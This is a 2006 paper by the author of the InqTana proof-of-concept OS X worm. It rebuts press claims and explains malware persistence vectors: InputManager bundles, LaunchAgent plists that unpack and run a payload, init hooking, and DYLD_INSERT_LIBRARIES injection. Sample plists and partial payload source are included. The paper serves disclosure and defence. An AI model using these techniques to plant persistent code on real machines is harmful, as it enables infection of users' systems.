@@ -1,0 +1,258 @@
+
+				InqTana Through the eyes of Dr. Frankenstein.
+		                     kf_lists[at]digitalmunition[dot]com
+
+This sole intent of this paper is to address both FUD and Rumors surrounding the release of detailed information about 
+the InqTana proof of concept worm. After reading internet based news over the past few days I have certainly seen my 
+fair share of 'spin' and misconception regarding the results of my research. Some of my favorite comments are listed here:
+
+-"Until Symantec tells people exactly what it does and where it came from I'm calling this salesmanship."
+-"Probably just a lame variation on the Leap.A fiasco"
+-"This may be nothing more than a copycat reaction to a new threat that received a great deal of media attention"
+-"The OSX/Inqtana.A requires the user to accept 3 separate Bluetooth file transfers"
+-"No system can be infected without multiple decisions on the part of the user."
+-"...in order to become infected with this proof-of-concept, the user must accept not one, not two, but three PUSH requests."
+-"...there are no mechanisms in the OS for silent and automatic infection."
+-"...Anyway, I don't think it would be very successful. How many Macs are routinely around other Macs with bluetooth on?"
+-"Mac OS X 10.4 (Tiger) users are still advised to make sure they're patched up in order to guard against attack"
+
+Most of these statements are slightly humorous to say the least. This worm quite honestly has nothing to do with any 
+Anti-Virus company. The concept of worming the vulnerability that I originally disclosed to apple was one of the first 
+thoughts on my mind when I found the bug. Unfortunately I had a limited amount of time to really research the full potential 
+of the bug I had discovered. The main reason that the length of time between the patch and the worm was so great has nothing 
+to do with an AV company marketing ploy. I simply have other things going on in my life, writing a worm was just not on the 
+top of my list. Beyond simple technical issues I found it difficult to communicate with any AV company beyond Symantec about
+my concerns. 
+
+The fact that both Leap.A and InqTana.A were released back to back was also purely coincidental, Symantec, Sophos, F-secure 
+and all the other companies that various folks have accused of planting these PoC worms had absolutely NOTHING to do with 
+InqTana. Aside from a similar release date InqTana.A itself has absolutely nothing to do with Leap.A. My work was done 
+completely independent of the author of Leap. The day after I sent out queries to the AV companies about my code I was shocked 
+to see another OSX worm had already been in the news. While my worm sat in the mail spools of several AV companies they were 
+busy writing about the "First Trojan/Worm for OSX".
+
+With regard to the incorrect data being provided about the exploit portion of the worm I must simply tell the reporters out 
+there to DO YOUR HOMEWORK FIRST, then write your articles. The Bluetooth vulnerability was first disclosed in DMA[2005-0502a] 
+and in a follow-up titled Bluetooth_dot_dot.txt. The data was released in May of 2005 after apple had patched the issue in 
+10.3. Tiger aka 10.4 was released shortly after the patches were made available, however it was shipped in a vulnerable state. 
+APPLE-SA-2005-05-03 and APPLE-SA-2005-06-08 fully address the issue with the Apple Bluetooth stack. The bottom line is that 
+BOTH 10.4 and 10.3 are vulnerable. http://www.securityfocus.com/bid/13491 contains full details surrounding the issue. One 
+thing I cannot stress enough is that I chose to make this worm prompt the user for interaction... it is NOT a required 
+function. My intent was to prove a concept not create a functional worm however. 
+
+Putting all of that aside I think most people missed the point of this worm and its variants. The main focus was not on the 
+usage of Bluetooth for the exploit medium, or the vulnerability used. The focus should have been on the usage of built in OSX 
+facilities to spread malicious code. OSX contains features, which will certainly aid in the future of malware on OSX. 
+
+Although little detail was provided on exactly how Leap.A hooked the functions of iChat it is very likely that MethodSwizzling [1] 
+was used. The Objective-C runtime effectively allows you to "patch" methods in code you don't have the source to. Rather than 
+completely replacing the original method, MethodSwizzling lets your method make use of the original, almost like subclassing. 
+Once you combine this ability with an InputManager [2] in bundle form [3] you wind up with a recipe for instant malware. Even 
+though InputManagers in bundle form can have legit [4] uses it is highly likely that this facility will become a common malware 
+vector. This method seems to be portable across both 10.4 and 10.3.
+
+Leap.A chose to drop an InputManager named "apphook" into ~/Library. 
+
+k-fs-ibook:~/Library/InputManagers kf$ ls
+Info            apphook.bundle
+
+The LoadBundleOnLaunch property was set to ensure that the bundle would load with every application that launches. 
+
+k-fs-ibook:~/Library/InputManagers kf$ cat Info
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+        <key>BundleName</key>
+        <string>apphook.bundle</string>
+        <key>LoadBundleOnLaunch</key>
+        <string>YES</string>
+        <key>NoMenuEntry</key>
+        <string>YES</string>
+</dict>
+</plist>
+
+The actual binary of the malicious bundle can be found in the Contents/MacOS folder. 
+k-fs-ibook:~/Library/InputManagers kf$ file apphook.bundle/Contents/MacOS/apphook
+apphook.bundle/Contents/MacOS/apphook: Mach-O bundle ppc
+
+Because the strings "com.apple.iChat" and "com.apple.mail" were found in data from the actual bundle we assume that malware will 
+attempt to hook both iChat and apple Mail. Most likely the author attempted to isolate which programs his code hooked via a 
+snippet of code similar to the following: 
+
+//Look if we are running in iChat 
+if(![[NSBundle mainBundle] bundleIdentifier] isEualTo:@"com.apple.iChat:])
+{
+	return; // Not iChat -> Do Nothing (borrowed from SubEthaFari)
+}
+
+At this point the author goes on to hook into the methods used for sending outbound messages in an attempt to continue spreading 
+itself. 
+
+MethodSwizzling is not the only malware vector in the arsenal of future OSX malware authors. During the development of the code 
+dubbed 'InqTana' I developed and made use of 3 seperate techniques to deploy and distribute a payload. Several facilities exist 
+within the OSX operating system that will help facilitate the spread of malware. I will outline each of the techniques that my 
+InqTana variants seek to demonstrate. 
+
+During early attempts to create an environment in which an OSX worm could be sustained I failed repeatedly to find a suitable vector 
+which would allow an attacker to run code. With the arrival of OSX 10.4 however, I quickly noted how convienent the new Launchd [5] 
+facility was. You honestly could not ask for a much simpler method for code execution. Simply drop a properly formatted file in the 
+correct directory and you are good to go. 
+
+k-fs-ibook:~/Library/LaunchAgents kf$ ls
+com.openbundle.plist    com.pwned.plist
+
+InqTana.A used com.openbundle.plist to unpack the payload of the main worm shortly before running it via com.pwned.plist. 
+
+k-fs-ibook:~/Library/LaunchAgents kf$ cat com.openbundle.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+        <key>Label</key>
+        <string>com.openbundle</string>
+        <key>ProgramArguments</key>
+        <array>
+                <string>/usr/bin/tar</string>
+                <string>-Pzxvf</string>
+                <string>/Users/w0rm-support.tgz</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+</dict>
+</plist>
+
+Because launchd did not exist in 10.3 this will only work on 10.4 machines. 
+
+Following the arrival of the Leap.A worm I toyed with the idea of hooking one of the programs that starts when a normal user logs 
+into the OSX GUI. After cornering a few particular applications I decided that too much was involved in selecting a method to mutate 
+for worm distribution purposes. Rather than taking a  granular approach, I decided it would be easier to hook the '- init' function 
+that is called when all bundles are loaded. 
+
+The same general technique that Leap.A is used however the bundle payload is slightly modified. 
+k-fs-ibook:~/Library/InputManagers/InqTanaHandler kf$ ls
+Info                    InqTanaHandler.bundle
+
+As we can see from the source code hooking the module init is quite easy. 
+
+k-fs-ibook:/Users/Users/InqTanaHandler kf$ cat InqTanaHandler.m
+//
+//  InqTanaHandler.m
+//  InqTanaHandler
+//
+//  Created by Kevin Finisterre on 2/19/06.
+//  Copyright 2006 __MyCompanyName__. All rights reserved.
+//
+
+#import "InqTanaHandler.h"
+#import </usr/include/objc/objc-class.h>
+
+@implementation InqTanaHandler
+- init
+{
+    if (self=[super init])
+    {
+
+                int x = open("/tmp/w0rms.love.apples", O_RDWR);
+...
+
+Lots of care must be in mind when hooking the system in this manor. One bad move can make for some nasty results. 
+
+The final method I am going to discuss involves a 'relic left over from OpenStep/NextStep' [6]. OSX provides a facility  by which 
+users have the ability to set specific environment variables for all processes that they launch. Coincidentally this method can also 
+be used to potentially spread malware. 
+
+~/.MacOSX/environment.plist can be used to specify variables that may influence the behavior of dyld [7]. By setting the 
+DYLD_INSERT_LIBRARIES variable we are able to force all applications to run our payload. Unfortunately in versions of OSX 
+below 10.4 dyld appears to be TOO lazy to run a trojaned .dylib file. 
+
+k-fs-ibook:~/Library kf$ cd ~/.MacOSX/
+k-fs-ibook:~/.MacOSX kf$ cat environment.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist SYSTEM
+"file://localhost/System/Library/DTDs/PropertyList.dtd">
+<plist version="0.9">
+<dict>
+        <key>DYLD_INSERT_LIBRARIES</key>
+        <string>/pwned.dylib</string>
+</dict>
+</plist>
+
+Using methods outlined in Apple's Dynamic Library Design Guidelines [8] we can make use of either a malicious Initializer 
+or Finalizer to spread malware. 
+
+k-fs-ibook:/Users/Users kf$ cat pwned.c
+//  gcc -dynamiclib pwned.c -o pwned.dylib
+
+#include <stdio.h>
+#include <sys/fcntl.h>
+#include <pwd.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+
+extern char * argv;
+
+__attribute__((constructor))
+static void w0rmy()
+{
+                chmod("/tmp/w0rms.love.apples", 0777);
+
+Because programs that are initially launched when a user logs in seem to be run from '/' the dyld appears to also want our trojaned 
+.dylib to reside in '/'. Be careful here... you can break your box if you get this wrong. 
+
+k-fs-ibook:~/Library/Logs/CrashReporter/ kf$ cat iTunesHelper.crash.log
+**********
+
+Host Name:      k-fs-ibook
+Date/Time:      2006-02-20 11:48:33.250 -0500
+OS Version:     10.4 (Build 8A428)
+Report Version: 3
+
+Command: iTunesHelper
+Path:    /Applications/iTunes.app/Contents/Resources/iTunesHelper.app/Contents/MacOS/iTunesHelper
+Parent:  WindowServer [629]
+
+Version: 4.7.1 (4.7.1)
+
+PID:    661
+Thread: Unknown
+
+Link (dyld) error:
+
+could not load inserted library: "pwned.dylib"
+
+Moving pwned.dylib to / corrected the above behavior which results in a completely unusable user account otherwise. Once again because 
+all of the programs that a user runs will attempt to run this code, special care needs to be taken to make sure the payload is not 
+stepping on itself. 
+
+Because samples of these variants have been sent to most major anti-virus companies attacks that are similar in nature should be 
+quarantined in the future. Further OS level permissions changes can help mitigate the risks associated with the various facilities 
+that OSX provides by default. 
+
+The four techniques above provide obvious vectors for current malware writers to abuse OSX. Some things obviously need to be changed 
+with regard to access to the facilities these techniques take advantage of. Now is the time to be diligent and to discover and augment 
+similar behavior. OSX is NOT immune to worms and virii.... don't kid yourself.
+
+In closing I would like to once again state that the InqTana code was designed to run in a controlled environment limited to 3 
+bluetooth devices. 11:22:33:44:55:66, 33:33:33:44:44:44, and 44:44:44:55:55:55. In the event that the code were to somehow spread 
+beyond the initial test environment several other factors limit its ability to actually spread in the wild. The bluetooth library 
+that InqTana is based on is set to expire on 02/25/06. In addition to the expiration date the Exception handeler of InqTana is 
+intentionally crippled to halt upon any errors encountered by the code. 
+
+InqTana was manufactured specifically as proof of concept. The code was distributed to both Apple and Anti-Virus companies in efforts 
+to identify and mitigate behavior that could be used in the future as a malware vector on the OSX platform. 
+
+[1] http://www.cocoadev.com/index.pl?MethodSwizzling
+[2] http://developer.apple.com/documentation/Cocoa/Conceptual/InputManager/Tasks/InputServerDeployment.html
+[3] http://fsb.mackb.net/bundle
+[4] http://codingmonkeys.de/map/log/articles/2004/07/20/subethafari 
+[5] http://developer.apple.com/macosx/launchd.html
+[6] http://developer.apple.com/qa/qa2001/qa1067.html
+[7] http://developer.apple.com/releasenotes/DeveloperTools/dyld.html
+[8] http://devworld.apple.com/documentation/DeveloperTools/Conceptual/DynamicLibraries/Articles/DynamicLibraryDesignGuidelines.html
+
+k-fs-ibook:~ kf$ /usr/bin/say "All, your bluetooth, and OSX,,, are belong,, to, us" 
+
+
+
